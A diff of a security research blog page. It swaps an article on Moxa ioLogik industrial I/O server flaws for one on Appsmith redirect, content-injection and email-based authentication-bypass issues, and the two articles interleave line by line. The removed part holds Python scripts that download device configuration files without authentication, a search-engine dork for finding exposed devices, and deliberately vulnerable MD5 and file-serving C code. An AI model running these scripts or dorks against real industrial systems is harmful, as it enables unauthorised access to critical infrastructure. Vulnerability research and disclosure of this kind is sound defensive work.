+        url = originHeader + "/user/login?error=true&amp;message=" + URLEncoder.encode(exception.getMessage(), StandardCharsets.UTF_8);
     } else {
-        // Error: Invalid file requested
-        printf("Error: Invalid file requested\n");
+        url = originHeader + "/user/login?error=true";
     }
-
-    return 0;
-}
-</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="908" height="502" src="/wp-content/uploads/2024/01/image-4.png" alt="" class="wp-image-8313" srcset="/wp-content/uploads/2024/01/image-4.png 908w, /wp-content/uploads/2024/01/image-4-300x166.png 300w, /wp-content/uploads/2024/01/image-4-768x425.png 768w" sizes="(max-width: 908px) 100vw, 908px" /></figure>
-
-
-
-<p class="wp-block-paragraph">In this Python script, we use the requests library to send a GET request to the vulnerable web application (vulnerable_url) with a payload containing the filename ik1212.txt as a query parameter.</p>
-
-
-
-<p class="wp-block-paragraph">If the vulnerable web application is susceptible to broken access controls and allows unauthorized users to download configuration files without proper authentication or authorization checks, the script will successfully retrieve and print the contents of the ik1212.txt configuration file.</p>
-
-
-
-<pre class="wp-block-code"><code>import requests
-
-# URL of the vulnerable web application
-vulnerable_url = "http://example.com/download.cgi"
-
-# Payload to download the configuration file
-payload = {"file": "ik1212.txt"}
-
-# Send the malicious request to download the configuration file
-response = requests.get(vulnerable_url, params=payload)
-
-# Check if the request was successful
-if response.status_code == 200:
-    # Print the contents of the configuration file
-    print(response.text)
-else:
-    print("Failed to download configuration file.")
-</code></pre>
-
-
-
-<h2 class="wp-block-heading">Cryptography Failure</h2>
-
-
-
-<p class="wp-block-paragraph">Cryptography plays a pivotal role in ensuring data confidentiality and integrity. However, the effectiveness of cryptographic measures hinges on the algorithms and methodologies employed. MD5, once a popular hashing algorithm, has over the years been found to have significant vulnerabilities. Relying on MD5 for password hashing in modern systems is a glaring example of cryptography failure.</p>
-
-
-
-<ul class="wp-block-list">
-<li>The Scenario: Imagine a system that stores user passwords after hashing them with the MD5 algorithm. While this might seem secure at first glance, the inherent weaknesses of MD5 make these hashed passwords susceptible to attacks.</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;stdlib.h>
-#include &lt;string.h>
-#include &lt;openssl/md5.h>
-
-// Function to hash a password using MD5
-void hashPassword(const char *password, unsigned char *hashedPassword) {
-    MD5_CTX md5Context;
-    MD5_Init(&amp;md5Context);
-    MD5_Update(&amp;md5Context, password, strlen(password));
-    MD5_Final(hashedPassword, &amp;md5Context);
 }
 
-int main() {
-    char password&#91;100];
-    unsigned char hashedPassword&#91;MD5_DIGEST_LENGTH];
-
-    // Simulate user input (password)
-    printf("Enter your password: ");
-    scanf("%s", password);
-
-    // Hash the password using MD5
-    hashPassword(password, hashedPassword);
-
-    // Print the hashed password
-    printf("Hashed password (MD5): ");
-    for (int i = 0; i &lt; MD5_DIGEST_LENGTH; i++) {
-        printf("%02x", hashedPassword&#91;i]);
-    }
-    printf("\n");
-
-    return 0;
+if (redirectUrl != null &amp;&amp; !redirectUrl.trim().isEmpty()) {
+    url = url + "&amp;" + REDIRECT_URL_QUERY_PARAM + "=" + redirectUrl;
 }
-</code></pre>
 
+defaultRedirectLocation = URI.create(url);
+return this.redirectStrategy.sendRedirect(exchange, defaultRedirectLocation);</code></pre>
 
 
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="893" height="336" src="/wp-content/uploads/2024/01/image-5.png" alt="" class="wp-image-8314" srcset="/wp-content/uploads/2024/01/image-5.png 893w, /wp-content/uploads/2024/01/image-5-300x113.png 300w, /wp-content/uploads/2024/01/image-5-768x289.png 768w" sizes="(max-width: 893px) 100vw, 893px" /></figure>
 
+<p class="wp-block-paragraph">Here&#8217;s a breakdown of what the code does:</p>
 
 
-<p class="wp-block-paragraph">In this vulnerable C code, we&#8217;re using the MD5 hashing algorithm from the OpenSSL library (&lt;openssl/md5.h&gt;) to hash user passwords. However, MD5 is known to have significant vulnerabilities, including collision attacks and pre-image attacks, which make it unsuitable for secure password hashing.</p>
 
+<ol class="wp-block-list">
+<li>It declares a variable <code>defaultRedirectLocation</code> of type <code>URI</code> and initializes a string variable <code>url</code> as an empty string.</li>
 
 
-<p class="wp-block-paragraph">To exploit this vulnerability, an attacker could use various techniques such as rainbow tables or brute-force attacks to crack the hashed passwords generated by this vulnerable program, thereby compromising the security of the system.</p>
 
+<li>The code checks if the exception being handled is an instance of <code>OAuth2AuthenticationException</code> and if the error code matches a specific error related to disabled sign-up (<code>AppsmithError.SIGNUP_DISABLED.getAppErrorCode()</code>). If it matches, it constructs a URL for the signup page with an error message encoded in the URL.</li>
 
 
-<h2 class="wp-block-heading">Scope of the Issues</h2>
 
+<li>If the exception is not an instance of <code>OAuth2AuthenticationException</code>, it checks if it is an instance of <code>InternalAuthenticationServiceException</code>. If it is, it constructs a URL for the login page with an error message encoded in the URL. Otherwise, it constructs a URL for the login page without an error message.</li>
 
 
-<p class="wp-block-paragraph">Moxa is a renowned leader in industrial networking, computing, and automation solutions, catering to diverse sectors such as transportation, energy, and manufacturing. Among its prominent offerings is the ioLogik series, comprising robust remote Ethernet I/O servers designed to facilitate seamless data acquisition and device connectivity in industrial environments. However, recent revelations have shed light on vulnerabilities plaguing a subset of these devices, raising concerns about the security posture of industrial networks worldwide.</p>
 
+<li>If a <code>redirectUrl</code> is provided and not empty, it appends it to the URL as a query parameter.</li>
 
 
-<p class="wp-block-paragraph">With over 6000 ioLogik devices deployed globally, these vulnerabilities pose a significant threat to industrial networks&#8217; integrity and security. Shockingly, an alarming 150 devices have been identified as vulnerable to exploitation due to inherent flaws in their design and configuration. Compounding the problem is the absence of default authentication mechanisms in ioLogik devices, leaving them susceptible to unauthorized access and malicious exploitation.</p>
 
+<li>The <code>defaultRedirectLocation</code> variable is set as a URI created from the constructed URL.</li>
 
 
-<p class="wp-block-paragraph">dork:</p>
 
+<li>Finally, the code uses a redirect strategy (possibly from a framework or library) to perform a redirect to the <code>defaultRedirectLocation</code>.</li>
+</ol>
 
 
-<ul class="wp-block-list">
-<li>title:&#8221;Remote Ethernet I/O Server&#8221;</li>
-</ul>
 
+<p class="wp-block-paragraph">Content injection refers to a type of vulnerability where an attacker is able to inject malicious content or modify the intended content within a web application. In the URL you provided:</p>
 
 
-<p class="wp-block-paragraph">Unveiling Vulnerabilities</p>
 
+<p class="wp-block-paragraph"><a href="https://appsmith.dev/user/signup?error=There+is+already+an+account+registered+with+this+email+user%40example.com.+Please+sign+in+instead."><strong><mark style="background-color:rgba(0, 0, 0, 0);color:#201cf0" class="has-inline-color">https://appsmith.dev/user/signup?error=There+is+already+an+account+registered+with+this+email+user%40example.com.+Please+sign+in+instead.</mark></strong></a></p>
 
 
-<p class="wp-block-paragraph">The vulnerabilities in the Moxa ioLogik series have garnered attention due to their potential to compromise the confidentiality, integrity, and availability of industrial systems. Through comprehensive analysis and testing, security researchers have unearthed critical flaws, including but not limited to:</p>
 
+<p class="wp-block-paragraph">The <code>error</code> query parameter is used to display an error message on the user signup page. However, it&#8217;s important to note that the URL appears to be an example or a demonstration, and I&#8217;m assuming it&#8217;s not an actual vulnerable endpoint in the application.</p>
 
 
-<ul class="wp-block-list">
-<li>Default Authentication Absence: One of the most glaring issues is the absence of default authentication mechanisms in ioLogik devices, effectively granting unauthorized users unrestricted access to sensitive functionalities and data.</li>
 
+<h3 class="wp-block-heading"><strong>Authentication Bypass</strong></h3>
 
 
-<li>Inadequate Input Validation: Insufficient input validation in certain ioLogik models leaves them vulnerable to injection attacks, enabling malicious actors to execute arbitrary commands or manipulate device configurations.</li>
 
+<p class="wp-block-paragraph">Authentication bypass refers to a vulnerability where an attacker can bypass the authentication mechanism of an application and gain unauthorized access. In the examples you provided, it appears that the intention is to demonstrate a potential vulnerability related to the handling of email addresses during user authentication.</p>
 
 
-<li>Authentication Bypass: Certain vulnerabilities allow attackers to bypass authentication mechanisms, gaining unauthorized access to device settings and control interfaces without proper credentials.</li>
 
+<p class="wp-block-paragraph">If an application does not properly validate and distinguish between email addresses that have different formatting (such as periods or capitalization differences), it may lead to an authentication bypass. In the examples you provided:</p>
 
 
-<li>Remote Code Execution: Exploitable vulnerabilities in ioLogik firmware facilitate remote code execution, empowering attackers to execute arbitrary commands with elevated privileges, potentially causing system-wide disruptions.</li>
-</ul>
 
+<ol class="wp-block-list">
+<li><a href="mailto:user@example.com"><strong><mark style="background-color:rgba(0, 0, 0, 0);color:#201cf0" class="has-inline-color">user@example.com</mark></strong></a> -&gt; <a href="mailto:user@gmail.com"><strong><mark style="background-color:rgba(0, 0, 0, 0);color:#201cf0" class="has-inline-color">user@gmail.com</mark></strong></a> By using a different domain (<code>user@gmail.com</code>), the attacker may attempt to bypass the email validation or matching process and gain unauthorized access.</li>
 
 
-<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" width="480" height="493" src="/wp-content/uploads/2024/01/image-6.png" alt="" class="wp-image-8315" style="width:480px;height:auto" srcset="/wp-content/uploads/2024/01/image-6.png 480w, /wp-content/uploads/2024/01/image-6-292x300.png 292w" sizes="(max-width: 480px) 100vw, 480px" /></figure>
 
+<li><a href="mailto:us.er@example.com"><strong><mark style="background-color:rgba(0, 0, 0, 0);color:#201cf0" class="has-inline-color">us.er@example.com</mark></strong></a> -&gt; <a href="mailto:us.er@gmail.com"><mark style="background-color:rgba(0, 0, 0, 0);color:#201cf0" class="has-inline-color"><strong>us.er@gmail.com</strong></mark></a> In this case, the attacker modifies the formatting of the email address (<code>us.er@example.com</code>) to resemble a different email address (<code>us.er@gmail.com</code>). If the application does not properly handle these formatting differences, it might result in an authentication bypass.</li>
+</ol>
 
 
-<p class="wp-block-paragraph">Impact on Industrial Networks</p>
 
+<p class="wp-block-paragraph">In the scenario you described, where an attacker has access to the email account <code>us.er@gmail.com</code> with <code>user@gmail.com</code>, they could potentially use the &#8220;Forgot Password&#8221; feature to initiate a password reset process for that account.</p>
 
 
-<p class="wp-block-paragraph">The implications of these vulnerabilities extend far beyond individual devices, posing significant risks to industrial networks&#8217; operational continuity, data confidentiality, and regulatory compliance. The compromised integrity of ioLogik devices can result in various detrimental outcomes, including:</p>
 
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="383" height="408" src="/wp-content/uploads/2023/06/r4.png" alt="architeture of users" class="wp-image-7159" srcset="/wp-content/uploads/2023/06/r4.png 383w, /wp-content/uploads/2023/06/r4-282x300.png 282w" sizes="(max-width: 383px) 100vw, 383px" /></figure>
 
 
-<ul class="wp-block-list">
-<li>Operational Disruption: Unauthorized access and control over ioLogik devices can lead to operational disruptions, downtime, and production delays, jeopardizing business continuity and revenue streams.</li>
 
+<p class="wp-block-paragraph">To prevent authentication bypass vulnerabilities related to email addresses, it&#8217;s crucial to implement robust email validation and normalization techniques. This includes ensuring proper email format validation, case-insensitive matching, and consistent handling of periods or other special characters in email addresses.</p>
 
 
-<li>Data Breaches: Breaching the confidentiality of industrial data stored and transmitted by ioLogik devices can result in sensitive information exposure, intellectual property theft, and regulatory non-compliance.</li>
 
+<h2 class="wp-block-heading" id="h-conclusion"><strong>Conclusion</strong></h2>
 
 
-<li>Safety Risks: Compromised integrity of industrial control systems facilitated by vulnerable ioLogik devices can pose safety risks to personnel, assets, and the environment, endangering lives and livelihoods.</li>
-</ul>
 
+<p class="wp-block-paragraph">By thoroughly understanding these vulnerabilities and their potential impact on the confidentiality, integrity, and availability of the system, developers and organizations can take proactive measures to strengthen the security posture of Appsmith-based applications.</p>
 
 
-<pre class="wp-block-code"><code>id: moxa-iologik-detection
-info:
-  name: Moxa ioLogik Detection
-  author: HADESS
-  severity: High
-  description: Detects Moxa ioLogik devices based on specific HTTP responses.
-requests:
-  - method: GET
-    path:
-      - /ik1212.txt
-    matchers-condition: OR
-    matchers:
-      - type: status
-        status:
-          - 200
-  - method: GET
-    matchers-condition: OR
-    path:
-      - /
-    matchers:
-      - type: word
-        words:
-          - "Welcome to ioLogik Series"
-    extractors:
-      - type: regex
-        regex: "Welcome to ioLogik Series"
-</code></pre>
 
+<p class="wp-block-paragraph">Mitigation strategies such as implementing multi-factor authentication, enforcing strong password requirements, employing granular access controls, validating and sanitizing user input, and ensuring the uniqueness of email addresses can significantly enhance the security of the platform.</p>
 
 
-<p class="wp-block-paragraph">Addressing the Security Concerns</p>
 
+<p class="wp-block-paragraph">By conducting rigorous assessments and implementing robust security controls, Appsmith can mitigate the risks associated with these vulnerabilities and create a secure environment for developing and deploying custom applications. This proactive approach ensures the protection of sensitive data, safeguards user privacy and establishes trust in the platform among developers and end-users alike.</p>
 
 
-<p class="wp-block-paragraph">In response to the identified vulnerabilities in the ioLogik series, Moxa has taken proactive measures to mitigate security risks and bolster the resilience of its products. These measures include:</p>
 
+<p class="wp-block-paragraph">Overall, this analysis serves as a valuable resource for developers and organizations utilizing Appsmith, guiding them in identifying, understanding, and addressing security risks effectively. By prioritizing security measures and remaining vigilant in keeping the platform secure, Appsmith can continue to enable the development of powerful and reliable applications while maintaining the highest standards of security.</p>
 
 
-<ul class="wp-block-list">
-<li>Security Patches: Moxa has released firmware updates and security patches to address known vulnerabilities and enhance the robustness of ioLogik devices&#8217; security posture.</li>
 
+<p class="wp-block-paragraph">Researchers:</p>
 
 
-<li>Enhanced Authentication: Implementing robust authentication mechanisms, including multi-factor authentication (MFA) and role-based access control (RBAC), to prevent unauthorized access and ensure only authorized users can interact with the devices.</li>
 
-
-
-<li>Input Validation: Strengthening input validation mechanisms to thwart injection attacks and ensure that user inputs are properly sanitized to prevent exploitation of vulnerabilities.</li>
-
-
-
-<li>Security Awareness: Promoting security awareness among customers, partners, and stakeholders to educate them about potential risks and best practices for securing ioLogik devices and industrial networks.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">To fetch relay information from a device at http://192.168.1.100, run:</p>
-
-
-
-<p class="wp-block-paragraph">python iologik_script.py &#8211;url http://192.168.1.100</p>
-
-
-
-<p class="wp-block-paragraph">To download the configuration file from a device at http://192.168.1.100, run:</p>
-
-
-
-<p class="wp-block-paragraph">python iologik_script.py &#8211;url http://192.168.1.100 &#8211;conf</p>
-
-
-
-<pre class="wp-block-code"><code>import requests
-import argparse
-
-def fetch_relay_information(url):
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            relay_info = response.text  # Assuming relay information is in the response body
-            print("Relay Information:")
-            print(relay_info)
-        else:
-            print(f"Failed to fetch relay information. Status Code: {response.status_code}")
-    except requests.RequestException as e:
-        print(f"Error fetching relay information: {e}")
-
-def download_configuration(url):
-    try:
-        response = requests.get(url + "/ik1212.txt")
-        if response.status_code == 200:
-            with open("ik1212.txt", "wb") as file:
-                file.write(response.content)
-            print("Configuration file downloaded successfully.")
-        else:
-            print(f"Failed to download configuration file. Status Code: {response.status_code}")
-    except requests.RequestException as e:
-        print(f"Error downloading configuration file: {e}")
-
-def main():
-    parser = argparse.ArgumentParser(description="Moxa ioLogik E1212 Script")
-    parser.add_argument("--url", default="http://localhost", help="URL of the ioLogik E1212 device (default: http://localhost)")
-    parser.add_argument("--conf", action="store_true", help="Download configuration file /ik1212.txt")
-    args = parser.parse_args()
-
-    if args.conf:
-        download_configuration(args.url)
-    else:
-        fetch_relay_information(args.url)
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-
-
-
-<h2 class="wp-block-heading"><strong>Conclusion</strong></h2>
-
-
-
-<p class="wp-block-paragraph">In the intricate tapestry of cybersecurity, vulnerabilities such as CSRF, XSS, cryptography failures, and broken access controls emerge as critical threads that can unravel the entire fabric if not addressed promptly. Our analysis underscores the profound implications of these vulnerabilities, each of which can serve as a potential gateway for malicious actors.</p>
-
-
-
-<p class="wp-block-paragraph">The exploitation of CSRF to change passwords underscores the importance of ensuring that every request made to a web application is genuine and authorized. Without robust CSRF protections, attackers can manipulate users into performing unintended actions, leading directly to account takeovers. Similarly, XSS vulnerabilities, which allow attackers to inject malicious scripts into web pages, can compromise user sessions and provide unauthorized access to accounts, emphasizing the need for stringent input validation and output encoding.</p>
-
-
-
-<p class="wp-block-paragraph">Cryptography, the bedrock of data security, when compromised, can expose sensitive information, making systems susceptible to data breaches and espionage. The use of outdated or weak cryptographic algorithms can jeopardize the entire security infrastructure of an organization. Lastly, broken access controls, which determine who can access specific resources, can lead to unauthorized data access, system compromises, and potential exposure of confidential information when not properly implemented.</p>
-
-
-
-<p class="wp-block-paragraph">Collectively, these vulnerabilities highlight the interconnected nature of web security. Addressing one vulnerability in isolation is insufficient; a holistic approach is imperative. Organizations must prioritize regular security audits, adopt best practices in web development, and invest in continuous training to stay ahead of potential threats. In an era where digital interactions are the norm, ensuring the security of these interactions is paramount.</p>
+<p class="wp-block-paragraph">Negin Nourbakhsh (https://www.linkedin.com/in/negin-nourbakhsh-b515aa1aa)<br>Fazel Mohammad Ali Pour (ArganexEmad)</p>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -2157,27 +2769,27 @@ if __name__ == "__main__":
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -2304,11 +2916,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -2331,59 +2943,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
